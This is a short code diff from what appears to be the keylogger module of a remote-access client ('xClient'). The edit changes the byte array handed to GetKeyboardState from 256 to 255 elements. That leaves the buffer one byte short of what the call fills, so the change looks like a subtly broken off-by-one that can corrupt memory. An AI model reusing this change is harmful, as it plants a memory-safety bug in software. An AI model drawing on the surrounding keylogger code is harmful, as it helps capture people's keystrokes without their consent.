@@ -33,7 +33,7 @@ namespace xClient.Core.Keylogger.Implementation
         /// <returns>An instance of <see cref="KeyboardState" /> class representing a snapshot of keyboard state at certain moment.</returns>
         public static KeyboardState GetCurrent()
         {
-            byte[] keyboardStateNative = new byte[256];
+            byte[] keyboardStateNative = new byte[255];
             KeyboardNativeMethods.GetKeyboardState(keyboardStateNative);
             return new KeyboardState(keyboardStateNative);
         }
